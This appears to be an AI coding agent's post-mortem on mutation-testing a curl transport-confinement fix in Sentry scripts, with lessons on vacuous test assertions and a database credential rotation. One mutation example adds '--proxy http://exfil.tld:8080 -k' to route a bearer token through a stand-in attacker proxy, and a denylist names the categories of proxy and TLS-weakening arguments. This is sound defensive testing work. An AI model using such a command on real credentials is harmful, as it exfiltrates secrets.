---
module: System
date: 2026-09-10
problem_type: test_failure
component: testing_framework
symptoms:
  - "Suite reported 20/20 passed while a live bearer token went through an attacker proxy with certificate verification off"
  - "Deleting an entire guard's call site left the suite green at 0 failures"
  - "Neutering pass()/fail() to `:` printed 'Results: 0 passed, 0 failed' and exited 0"
  - "A stub's argv assertion silently disarmed when the subject wrapped its call in `env -i`"
root_cause: missing_validation
resolution_type: test_fix
severity: high
synced_to: [review, work]
tags: [mutation-testing, vacuous-guard, security, curl, transport-confinement, assertion-design, measurement]
---

# Every assertion I wrote to prove the fix could be satisfied while the defect was live

## Problem

#7997 was a small security fix: three credentialed `curl` call sites in two Sentry scripts were
neither transport-confined (`--disable` first, `--noproxy '*'`) nor destination-pinned. The fix
itself was mechanical and correct on the first attempt.

**The tests asserting it were wrong four different ways, and every one of them was green.** It took
three rounds of mutation testing to find them, and the last round found the worst one.

This is the general hazard with a security fix: the assertions are written *while holding the defect
in mind*, so they encode the author's mental model of the attack rather than the property. The
guards are the high-risk surface, not the fix.

## The four vacuity classes

### 1. A prefix pin is not the property

`F16` pinned `argv[1..4]` (`--disable --noproxy '*' --proto`) and said nothing about the suffix.

Measured — appending to the correctly-prefixed call site:

```bash
curl --disable --noproxy '*' --proto '=https' -g --proxy http://exfil.tld:8080 -k -fsS ...
```

Result: **20/20 passed, 0 failed**, while sending a live bearer through an attacker-controlled proxy
with certificate verification disabled. That is this PR's own defect class, reintroduced past this
PR's own assertion.

The property is *"no argument RE-OPENS what the prefix closed"*, and a prefix pin structurally
cannot express it. The fix is to assert the **negative over the whole argv** — a denylist of
re-opening tokens across six categories (proxying, config re-read, protocol widening, destination
re-pointing, TLS weakening, glob re-enable) — **plus exactly-once cardinality** for `--noproxy` and
`--proto`, because a second occurrence silently supersedes the first:

```bash
curl --disable --noproxy '*' --proto '=https' -g --noproxy '' ...   # also green before the fix
```

### 2. A call site no fixture reaches has no coverage — and zero violations is indistinguishable from zero executions

The Gate-3 cleanup `DELETE` is the only non-idempotent credentialed call in
`sentry-monitors-audit.sh`. It had no argv assertion at all: no `#7997` row supplies a responder, so
every one of those runs died on its first request, far above Gate 3. The rows that *did* reach it
(`T16`/`T17`/`T20*`) wrote `violations.txt` and never read it.

The trap in the obvious fix: a run that never reaches Gate 3 *also* records zero violations. So the
new row asserts the call was **ISSUED** as well as confined:

```bash
d39=$(grep -c '^DELETE https://.*/releases/audit-probe-' "$T39/requests.txt" || true)
if [[ "$d39" -ge 1 && "$v39" -eq 0 ]]; then pass ...
```

Verified against three mutations: flags stripped, `--connect-to` appended, and the whole `DELETE`
deleted. All three redden; the third reddens on the count, not the violations.

### 3. A stub gate the subject can disarm

The stub's argv assertion was gated on an environment variable. Wrapping the credentialed call in
`env -i` — **the obvious next hardening step on this very ticket** — silently turned the assertion
off and left an unconfined credentialed request passing.

The gate now lives in a **file** in the stub's own directory, with the path baked in at creation, so
scrubbing the child environment cannot reach it:

```bash
STUB_DIR="$dir"          # interpolated at stub-creation time
if [[ -f "$STUB_DIR/require_disable" ]]; then ...
```

### 4. A floor routed through the helper it backstops

Neutering `pass()`/`fail()` to `:` made the suite print `Results: 0 passed, 0 failed` and exit 0 —
green having asserted nothing. The assertion-count floor called the very `fail()` that one edit
disarms.

Both the harness self-test and the floor now emit with `printf` + `exit 1`, never through the
helpers they check (ADR-193 precedent, and the defect
`scripts/guard-vacuity-floor.test.sh` exists to catch).

## Key insight — two process lessons that generalise past this PR

### A. A mutation ledger is only true for the tree it was measured on

I carried a survivor list (`A6`, `O1/O2`, `O3/O4`, `G1`) across rounds. On re-measurement **`O1/O2`
were already dead** — killed by rows added in a later round *for an unrelated purpose*: `F20`'s
63-octet boundary row and `T35`'s production-pairing row each happen to exercise a slug other than
the ambient one, which is exactly what an org-guard-narrowing mutation needs to trip on.

Acting on the inherited list would have produced busywork, and — worse — reporting those as
surviving would have been a false claim about coverage. **Re-drive every mutation against the
current tree before reporting a survivor.**

### B. "The documented API is the only write path" is an assumption, not a finding

On the sibling issue #7966 (rotate a leaked dev database credential) I verified the Supabase
Management endpoint existed, found both stored PATs returned `401`, and concluded the rotation was
blocked on minting a new PAT.

That was wrong, and **the operator's one-line question — "is there any way to do it without a
PAT?" — is what surfaced it, not my analysis.**

The object to be changed was a *Postgres role*. The Management API is one write path to it; SQL is
another. `ALTER ROLE postgres WITH PASSWORD` over the pooler connection we already held needs no PAT
at all.

> **General rule:** when the credential for a documented control plane is dead, enumerate the other
> write paths to the same **object** before declaring an operator step. Ask *"what is the thing being
> changed?"*, not *"what is the API for changing it?"*.

#### B1. Settle a hazard with a reversible experiment, not an argument

The reason not to do the SQL rotation blind: if Supavisor cached the upstream credential, an `ALTER`
would change Postgres, strand the pooler, and lock out the **only reachable path** into the dev
database (the direct host is IPv6-only and unreachable from this workstation) with no live PAT to
recover through — strictly worse than the leak being fixed.

Rather than reasoning about it, I tested it: created a throwaway role, wrote its verifier into
Postgres, then connected to the **pooler** as that brand-new principal Supavisor had never seen.

```
RESULT: pooler ACCEPTED the brand-new role -> {"who":"soleur_rotcheck_tmp"}
```

Supavisor resolves credentials from the live database. Role dropped, absence re-verified. A
reversible experiment settled in 30 seconds what documentation-reading could not.

#### B2. An instrument claim needs a control

The Supabase `401` was read as "dead credential" **only after** running two controls — a
deliberately bogus `sbp_000…` token, and no `Authorization` header at all. Both returned the
byte-identical `{"message":"Unauthorized"}`.

This mattered because
[2026-06-16-supabase-mgmt-api-401-is-often-validation-not-auth.md](2026-06-16-supabase-mgmt-api-401-is-often-validation-not-auth.md)
records a Supabase `401` that was really *field-level validation*. Its own discriminator — print the
**body**, and note its `GET` returned `200` — is what distinguished the two cases here (this one
`401`s on the bare `GET`, with no request body to validate).

## Verification

All measured this session:

| suite | result |
|---|---|
| `test-sentry-alert-live-fidelity.sh` | 21/21 |
| `sentry-monitors-audit.test.sh` | 50/50 |
| `lint-shell-trace-credential-refusal.test.sh` | 61/61 |
| `test-sentry-alert-drift-workflow.sh` | 5/5 |
| `test-sentry-monitors-audit-class-d.sh` | 13/13 |
| `stub-argv-fidelity.test.sh` | PASS |
| `reusable-release-caller-permissions.test.sh` | 4/4 |
| `reusable-release-degraded-pointer.test.sh` | 25/25 |
| `reusable-release-idempotency.test.sh` | 26/26 |
| `reusable-release-zot-mirror-retry.test.sh` | 24/24 |

Plus: 3 workflows parse, 31 `run:` blocks `bash -n` clean; repo-wide lint 1032 scanned, D-baseline
65 entries, rc=0.

**Not run, stated plainly:** the `scripts` `TEST_GROUP` shard was **REFUSED (rc=4)** behind a sibling
full-gate run in flight for ~50 minutes. Per the token-discipline guidance for exactly that case,
the targeted suites covering the diff were run instead — listed above. **This is not a claim that
the shard passed.**

Also: this branch adds 4 new `actionlint` `SC2016` findings, all the documented-benign
markdown-backtick / `sed`-anchor shape (single-quoting is *correct* in each — double-quoting the
backticked ones would command-substitute). CI asserts only that `actionlint` **terminates** (93
pre-existing findings; drawdown tracked in #7042), so this is not a gate regression.

## Session Errors

**F1. `doppler run` overwrites the inherited environment** — three "green" refusal arms had never
fired, because `env` assignments were placed outside the child.
**Prevention:** put `env` INSIDE the child; prove every refusal test actually fires.

**F2. `LC_ALL=C [[ … ]]` is a parse error** — `[[` is a keyword and takes no env prefix.
**Prevention:** use `( LC_ALL=C; [[ … ]] )`.

**F3. `_safe` called above its own definition.**
**Prevention:** define helpers before first use; `bash -n` does not catch this.

**F4. `discoverability_test` was a proxy** — a compliant-looking prototype printed the exact
expected output with the entire destination layer absent.
**Prevention:** mutate the thing out and confirm the test reddens.

**1. A contaminated `grep --include=*.tf`** — the filter silently did not apply, markdown polluted
the enumeration, and I raised a **false P2** against correct code.
**Prevention:** `git grep -l … -- '*.tf'`; verify an instrument against a known control before
reading its output.

**2. `grep -c .` on an empty file prints `0` AND exits 1** — `|| echo 0` appended a second zero, so
`[[ "0\n0" -eq 0 ]]` raised an arithmetic error and the guards had been correct all along.
**Prevention:** `wc -l <`.

**3. T22's execution-site guard tripped by my own respelling** of the `CURL_BIN` comparison — it
counts `curl` spellings.
**Prevention:** check what a counter counts before adding a line it will see.

**4. Invented `$audit_log` in `reusable-release.yml`** — the variable existed nowhere.
**Prevention:** never reference a variable you did not create in the same block.

**5. Read `$?` after a pipe** — always `tee`'s status, hence always 0.
**Prevention:** `PIPESTATUS[0]`.

**6. Reported a pushed SHA after a FAILED push** — a non-fast-forward masked by my own pipe.
**Prevention:** verify against `git ls-remote`, never the local ref.

**7. The `_safe` Unicode fix failed twice** — `$' '` does not ANSI-C-expand inside a
`${var//[...]}` glob bracket; precomputing it still failed because bash renders `\u` in the CURRENT
locale, so under `LC_ALL=C` it yields literal bytes.
**Prevention:** explicit UTF-8 bytes, verified in both locales.

**8. T38 counted `sentry.io` matches rather than array MEMBERS** — a fifth member that was not a
`sentry.io` host (the dangerous addition) was invisible.
**Prevention:** count the members, not a substring of them.

**9. F15 short-circuited on the wrong guard** — with a fixed host, widening the org class made the
HOST pin refuse first, so the org guard was never exercised.
**Prevention:** derive downstream inputs from the value under test.

**10. Emitted `<stop>BLOCKED: nothing</stop>`** — a self-contradiction; the operator corrected it
with "you didn't continue".
**Prevention:** if nothing is blocking, continue; a stop needs a named blocker.

**11. Worktree reaped mid-run** after a session boundary released the lease — 0 commits and no PR
matched the stale-empty shape `cleanup-merged` deletes.
**Prevention:** claim the draft PR immediately on worktree creation.

**12. Inherited a mutation survivor list across rounds without re-measuring** — see Key Insight A.
**Prevention:** re-drive every mutation against the current tree before reporting a survivor.

**13. Asserted #7966 was blocked on a dead PAT** by assuming the Management API was the only write
path — see Key Insight B.
**Prevention:** enumerate write paths to the object, not to the documented API.

## Related

- [2026-06-16-supabase-mgmt-api-401-is-often-validation-not-auth.md](2026-06-16-supabase-mgmt-api-401-is-often-validation-not-auth.md) — the 401 discriminator that made B2 safe
- [2026-09-07-every-instrument-i-built-to-check-my-own-work-could-not-tell-clean-from-never-ran.md](2026-09-07-every-instrument-i-built-to-check-my-own-work-could-not-tell-clean-from-never-ran.md) — the same could-not-measure/measured-clean collapse, one level up
- [2026-09-04-every-fix-reintroduced-the-class-it-was-fixing.md](2026-09-04-every-fix-reintroduced-the-class-it-was-fixing.md) — vacuity class 1 is another instance
- #7997 (this fix), #8042 (region-discovery follow-up), #7966 / #8028 (the credential rotation), #7042 (actionlint drawdown)
